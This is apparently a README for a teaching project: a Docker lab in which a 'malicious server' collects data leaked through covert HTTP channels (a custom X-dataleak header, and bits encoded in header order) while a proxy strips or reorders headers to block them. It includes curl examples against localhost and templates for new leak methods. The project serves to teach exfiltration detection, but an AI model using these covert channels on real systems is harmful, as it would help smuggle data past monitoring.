# Data Leak Detection and Prevention System

A Docker-based system demonstrating HTTP data exfiltration techniques and their prevention through a transparent proxy/bridge.

## Architecture

The system consists of two Docker containers:

- **Malicious Server** (port 8001): An HTTP service that receives and stores data leaked through covert HTTP channels.
- **Proxy/Bridge** (port 8000): A transparent proxy that intercepts requests and neutralizes data leak attempts before forwarding them to the server.

```
Client ──► Proxy (:8000) ──► Malicious Server (:8001)
              │
              └─ Filters PUT requests to
                 prevent data exfiltration
```

### Supported Data Leak Methods

1. **Dedicated Header** (`dedicatedheader`): Data is sent in the `X-dataleak` HTTP request header as a base64-encoded string.
2. **Headers Order** (`headersorder`): Data is encoded bit-by-bit across multiple HTTP requests. Each request encodes a single bit by the relative ordering of the 3rd and 4th header lines (the two headers immediately after `Host`). If the 3rd header name is lexicographically less than the 4th, a `0` bit is transmitted; otherwise, a `1`. Eight consecutive `0` bits signal end of transmission.

All data is base64-encoded before transmission.

## Prerequisites

- [Docker](https://www.docker.com/get-started) and Docker Compose

## Build and Run

```bash
docker compose up --build
```

This starts both services:
- Proxy at `http://localhost:8000`
- Malicious server at `http://localhost:8001`

To stop:

```bash
docker compose down
```

## API Endpoints

### POST /setup

Registers a new data leak session. Not filtered by the proxy.

**Request body** (JSON):
```json
{
  "entrypoint": "mysession",
  "type": "dedicatedheader"
}
```

- `entrypoint` (string): The URI path to use for subsequent PUT/GET requests.
- `type` (string): Either `dedicatedheader` or `headersorder`.

### PUT /:entrypoint

Sends leaked data to the server. **This is the only endpoint filtered by the proxy.**

- For `dedicatedheader`: include the `X-dataleak` header with the base64-encoded data.
- For `headersorder`: order the headers to encode a single bit per request.

### GET /:entrypoint

Retrieves the leaked data. Returns 200 with the data if the leak is complete, or 404 if the data is not yet available.

## Usage Examples

### Example 1: Dedicated Header (direct to server, leak succeeds)

```bash
# 1. Register a leak session
curl -X POST http://localhost:8001/setup \
  -H "Content-Type: application/json" \
  -d '{"entrypoint":"leak1","type":"dedicatedheader"}'

# 2. Send leaked data (base64 of "ciao" is "Y2lhbw==")
curl -X PUT http://localhost:8001/leak1 \
  -H "X-dataleak: Y2lhbw=="

# 3. Retrieve the leaked data
curl http://localhost:8001/leak1
# Response: {"data":"Y2lhbw=="}
```

### Example 2: Dedicated Header (through proxy, leak blocked)

```bash
# 1. Register via proxy
curl -X POST http://localhost:8000/setup \
  -H "Content-Type: application/json" \
  -d '{"entrypoint":"leak2","type":"dedicatedheader"}'

# 2. Attempt to send leaked data through proxy
curl -X PUT http://localhost:8000/leak2 \
  -H "X-dataleak: Y2lhbw=="
# Response: {"error":"Missing X-dataleak header"}
# The proxy stripped the X-dataleak header!

# 3. Verify no data was leaked
curl http://localhost:8000/leak2
# Response: {"error":"Data not available yet"}
```

### Example 3: Headers Order (direct to server, leak succeeds)

Each PUT request encodes a single bit. To send the character "Y" (ASCII 89, binary `01011001`), you would send 8 requests with headers ordered to produce each bit:

```bash
# Register the session
curl -X POST http://localhost:8001/setup \
  -H "Content-Type: application/json" \
  -d '{"entrypoint":"leak3","type":"headersorder"}'

# Bit 0 (value: 0) - Aaa < Bbb, so 3rd header < 4th header => bit 0
curl -X PUT http://localhost:8001/leak3 \
  -H "Aaa: x" -H "Bbb: x"

# Bit 1 (value: 1) - Bbb > Aaa, so 3rd header > 4th header => bit 1
curl -X PUT http://localhost:8001/leak3 \
  -H "Bbb: x" -H "Aaa: x"

# ... continue for all bits of the base64-encoded message,
# then send 8 requests encoding 0-bits to terminate.
```

### Example 4: Headers Order (through proxy, leak blocked)

The proxy alphabetically sorts non-essential headers, destroying the attacker's carefully chosen ordering. All bits are forced to `0`, and the server receives only garbage data.

## Project Structure

```
.
├── docker-compose.yml
├── README.md
├── group_CHANGEME.csv
├── server/
│   ├── Dockerfile
│   ├── package.json
│   └── src/
│       ├── index.js            # Express server entry point
│       ├── registry.js         # Plugin registry (auto-discovery)
│       └── leaks/
│           ├── dedicatedheader.js
│           └── headersorder.js
└── proxy/
    ├── Dockerfile
    ├── package.json
    └── src/
        ├── index.js            # HTTP proxy entry point
        ├── registry.js         # Filter registry (auto-discovery)
        └── filters/
            ├── dedicatedheader.js
            └── headersorder.js
```

## Extensibility: Adding a New Data Leak Method

The system uses a **plugin registry pattern**. Each leak method is a self-contained module that is auto-discovered at startup. To add a new method:

### Step 1: Create the server-side handler

Create a new file in `server/src/leaks/`, for example `server/src/leaks/mynewmethod.js`:

```javascript
const name = 'mynewmethod';

function handlePut(req, session) {
  // Extract leaked data from the request
  // Store it in session.data
  // Set session.complete = true when the full message is received
  return { status: 200, body: { status: 'ok' } };
}

function handleGet(session) {
  if (!session.complete) {
    return { status: 404, body: { error: 'Data not available yet' } };
  }
  return { status: 200, body: { data: session.data } };
}

module.exports = { name, handlePut, handleGet };
```

### Step 2: Create the proxy-side filter

Create a new file in `proxy/src/filters/`, for example `proxy/src/filters/mynewmethod.js`:

```javascript
const name = 'mynewmethod';

function filterRequest(req, headers) {
  // headers is an array of [name, value] pairs in order
  // Modify or remove headers to neutralize the leak
  // Return the modified headers array
  return headers;
}

module.exports = { name, filterRequest };
```

### Step 3: Rebuild

```bash
docker compose up --build
```

No changes to any existing code are required. The registries in both the server and proxy auto-discover new modules from their respective directories on startup.

### Handler Interface Reference

**Server handler** (`server/src/leaks/*.js`):
- `name` (string): The type identifier, matching the `type` value used in `/setup`.
- `handlePut(req, session)`: Processes a PUT request. `req` is the Express request object (use `req.rawHeaders` for header order). `session` is a mutable object stored per entrypoint. Must return `{ status, body }`.
- `handleGet(session)`: Processes a GET request. Must return `{ status, body }`.

**Proxy filter** (`proxy/src/filters/*.js`):
- `name` (string): Must match the server handler's name.
- `filterRequest(req, headers)`: Receives the raw request and an array of `[headerName, headerValue]` pairs. Must return the (possibly modified) headers array.

## Technologies

- Node.js 20 (Alpine)
- Express.js (server)
- Node.js `http` module (proxy)
- Docker / Docker Compose
